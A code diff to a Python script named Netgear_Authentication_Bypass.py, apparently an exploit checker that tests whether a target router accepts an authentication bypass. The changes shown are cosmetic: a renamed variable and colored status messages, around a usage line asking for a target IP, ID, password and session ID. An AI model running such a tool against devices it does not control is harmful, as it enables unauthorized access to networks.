@@ -4,7 +4,7 @@ import sys
 import base64
 from colorama import Fore
 
-decription= r"""
+description= r"""
  -----------------------------------------------------------------------------
 |                                                                            |
 |                                                                            |
@@ -33,13 +33,13 @@ def exploit(target, ID, password, sessionID):
 		auth = s.cookies.get_dict().get('auth')
 
 	if auth == 'ok':
-		print ('This device has this vulnerability\n')
 		print s.cookies.get_dict()
+		print (Fore.GREEN+" [+] This device has this vulnerability\n"+Fore.RESET)
 	else:
-		print ('This device does not have this vulnerability')
+		print (Fore.YELLOW+" [-] This device does not have this vulnerability"+Fore.RESET)
 
 if __name__ == "__main__":
-	print decription
+	print description
 	if len(sys.argv) is not 5:
 		print(Fore.YELLOW+"[-] Example: python Netgear_Authentication_Bypass.py <Target IP> <ID> <Password> <SessionID>"+Fore.RESET)
 		sys.exit()
